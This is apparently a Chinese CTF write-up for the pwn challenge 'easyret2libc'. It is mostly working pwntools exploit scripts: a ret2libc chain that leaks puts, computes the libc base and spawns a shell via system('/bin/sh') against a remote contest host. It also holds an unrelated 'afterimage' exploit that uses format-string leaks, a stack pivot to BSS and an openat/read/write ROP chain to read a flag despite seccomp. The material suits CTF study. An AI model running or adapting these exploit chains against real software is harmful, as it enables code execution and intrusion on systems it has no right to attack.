---
title: "easyret2libc"
date: 2026-11-25 10:02:11
categories:
  - "题目复现"
  - "其他赛事"
tags: ["ROP", "canary", "glibc2.35"]
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#14 -->
2026鲲鹏杯

![image-20261120173444416](/pwn-notes/images/notes/image-20261120173444416.png)

![image-20261120173555332](/pwn-notes/images/notes/image-20261120173555332.png)

没有开什么保护

也是轻松溢出

但是没有system函数，所以还是泄露libc

```
0x000000000040101a : ret
0x000000000040117e : pop rdi ; ret

```

里面有puts函数

![image-20261120174520483](/pwn-notes/images/notes/image-20261120174520483.png)

![image-20261120174740541](/pwn-notes/images/notes/image-20261120174740541.png)

溢出大小：

0x20+0x8

![image-20261120175432477](/pwn-notes/images/notes/image-20261120175432477.png)

接收到地址

![image-20261120181505043](/pwn-notes/images/notes/image-20261120181505043.png)

脚本

```python
from pwn import *
context.log_level = 'debug'
libc = ELF('./libc.so.6')
p =remote('nc1.ctfplus.cn',47628)
elf = ELF('./pwn')

ret = 0x40101a
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
vlun = 0x401183
pop_rdi = 0x40117e

# ================= 第一次溢出：泄露 puts 真实地址 =================
pay = b'a' * 0x28
pay += p64(ret)       # 栈对齐
pay += p64(pop_rdi)   # 把 puts_got 传给 rdi
pay += p64(puts_got)
pay += p64(puts_plt)  # 调用 puts 打印地址
pay += p64(vlun)      # 返回漏洞函数，准备二次溢出

p.recvuntil(b'name: ')
p.sendline(pay)

# 接收泄露的地址（注意这里，用 recv(6) 最稳）
# 假设程序会打印一些废话，再打印地址。如果是直接打印，就直接 recv(6)
# 你可以根据实际输出情况修改 recvuntil 的字符串
p.recvuntil(b'you!\n') # 假设泄漏前有这句，如果没有请删掉
leak_addr = u64(p.recv(6).ljust(8, b'\x00'))
log.success(f"Puts Leak: {hex(leak_addr)}")

# ================= 计算 Libc 基址 =================
libc_base = leak_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

log.success(f"Libc Base: {hex(libc_base)}")
log.success(f"System: {hex(system_addr)}")
log.success(f"Binsh: {hex(binsh_addr)}")

# ================= 第二次溢出：执行 system("/bin/sh") =================
# 注意：此时缓冲区可能还有没接收干净的字符（比如换行符）。
# 我们直接发送 payload，如果是本地，send 后面加个 pause() 看看
payload = b'A' * 0x28
payload += p64(ret)       # 栈对齐
payload += p64(pop_rdi)   # 传参 /bin/sh
payload += p64(binsh_addr)
payload += p64(ret)       # 栈对齐（保证进入 system 时 RSP % 16 == 0）
payload += p64(system_addr)

# 确认一下是否真的回到了 name: 
# 如果卡住，可以直接尝试删掉这句 recvuntil
p.recvuntil(b'name: ') 
p.sendline(payload)

# 成功拿到 shell
p.interactive()
```

```python
from pwn import*
context.log_level='debug'
libc=ELF('./libc.so.6')
p=process('./pwn')
elf=ELF('./pwn')

ret=0x40101a
puts_plt=elf.plt['puts']
puts_got=elf.got['puts']
vlun=0x401183
pop_rdi=0x40117e
pay=b'a'*0x28+p64(ret)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(vlun)

p.recvuntil(b'name: ')
p.sendline(pay)
p.recvuntil(b'you!\n')
leak_addr = u64(p.recv(6).ljust(8, b'\x00')) 

libc_base = leak_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))

payload = b'A' * 0x28+p64(ret)
payload += p64(pop_rdi) 
payload += p64(binsh_addr)
payload += p64(ret)
payload += p64(system_addr)

p.recvuntil(b'name: ')
p.sendline(payload)


p.interactive()
```

别跟我说就只是少接受一个\n

直接给你完整exp

```python
# -*- coding: utf-8 -*-
"""
afterimage 最终 exp —— 栈迁移版（glibc 2.35）

为什么需要栈迁移：
  write() 是循环 read，累计上限 0x130 字节。从 ret addr(buf+0x98) 起只剩
  0x98=152 字节，放不下完整 orw 链(约 0x100+)。原来 0x198 的 payload 被截断。
  本脚本：栈上放短链 read(0,bss,0x400) 把长链读进 bss，再 leave;ret 迁过去。

要点：
  - saved rbp 覆盖成 BSS-8，配合程序自带的 leave;ret(0x127b) 迁移到 BSS
  - bss 用 0x4100（避开 0x4020/4030/4040 的 stdout/stdin/stderr 指针）
  - libc 基址：%15$p = puts+346，与版本无关
  - seccomp 禁 open/execve，orw 走 openat
"""
from pwn import *
import time

context(arch='amd64', os='linux', log_level='debug')

e = ELF('./pwn', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
p = process('./pwn')

PREVIEW_RET = 0x1768
LEAVE_RET   = 0x127b     # 程序自带 leave ; ret

def menu(c):
    p.recvuntil(b'> ')
    p.send(c)

def preview(fmt):
    menu(b'1\n')
    p.recvuntil(b'format:\n')
    p.send(fmt + b'\n')
    return p.recvuntil(b'\n', drop=True)

# ---------- 1. leak canary + PIE ----------
out = preview(b'%23$p.%25$p')
canary   = int(out.split(b'.')[0], 16)
pie_base = int(out.split(b'.')[1], 16) - PREVIEW_RET
log.success('pie_base = %#x' % pie_base)
assert pie_base & 0xfff == 0

# ---------- 2. leak libc：%15$p = puts+346 ----------
puts_ret = int(preview(b'%15$p'), 16)
libc_base = puts_ret - libc.sym['puts'] - 0x15a
log.success('libc_base = %#x' % libc_base)
assert libc_base & 0xfff == 0, 'libc_base 不对齐'

libc.address = libc_base
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
pop_rsi = rop.find_gadget(['pop rsi', 'ret']).address
ret     = rop.find_gadget(['ret']).address
g = rop.find_gadget(['pop rdx', 'ret'])
if g:
    pop_rdx, extra = g.address, 0
else:
    g = rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])
    assert g, '找不到 pop rdx'
    pop_rdx, extra = g.address, 1
log.info('pop_rdi=%#x pop_rsi=%#x pop_rdx=%#x extra=%d ret=%#x'
         % (pop_rdi, pop_rsi, pop_rdx, extra, ret))

def set_rdx(v):
    return p64(pop_rdx) + p64(v) + p64(0) * extra

BSS  = pie_base + 0x4100    # 阶段2 ROP 链
PATH = pie_base + 0x4200    # flag 路径
OUT  = pie_base + 0x4300    # flag 内容

# ---------- 3. 阶段1：栈上短链，读阶段2到 BSS，再栈迁移 ----------
stage1  = p64(pop_rdi) + p64(0)
stage1 += p64(pop_rsi) + p64(BSS)
stage1 += set_rdx(0x400) + p64(libc.sym['read'])   # read(0, BSS, 0x400)
stage1 += p64(pie_base + LEAVE_RET)                # leave;ret 跳到 BSS

# saved rbp = BSS-8 → leave;ret 后 rsp=BSS, rip=[BSS]
payload = b'A' * 0x88 + p64(canary) + p64(BSS - 8) + stage1
payload = payload.ljust(0x130, b'\x00')            # 正好 0x130，循环一次读完
menu(b'2\n')
p.recvuntil(b'payload:')
p.send(payload)

# ---------- 4. 阶段2：完整 orw 链，写到 BSS ----------
time.sleep(0.2)
AT_FDCWD = (-100) & 0xffffffffffffffff
ALIGN = False   # 若崩在 movaps，改成 True（开头多垫一个 ret）

stage2 = p64(ret) if ALIGN else b''
stage2 += p64(pop_rdi) + p64(0)
stage2 += p64(pop_rsi) + p64(PATH)
stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(0, PATH, 0x100) 读"flag"
stage2 += p64(pop_rdi) + p64(AT_FDCWD)
stage2 += p64(pop_rsi) + p64(PATH)
stage2 += set_rdx(0) + p64(libc.sym['openat'])          # openat(-100, "flag", 0)
stage2 += p64(pop_rdi) + p64(3)
stage2 += p64(pop_rsi) + p64(OUT)
stage2 += set_rdx(0x100) + p64(libc.sym['read'])        # read(3, OUT, 0x100)
stage2 += p64(pop_rdi) + p64(1)
stage2 += p64(pop_rsi) + p64(OUT)
stage2 += set_rdx(0x100) + p64(libc.sym['write'])       # write(1, OUT, 0x100)

p.send(stage2)              # 被阶段1的 read(0,BSS,0x400) 接收
time.sleep(0.2)
p.send(b'flag\x00')         # 被阶段2第一个 read 接收

p.interactive()

```

<!-- sync-hash: 58d49166c2b25d34a204dee593b79803b05d8b8fae6807ff3bdc26f583e0af16 -->
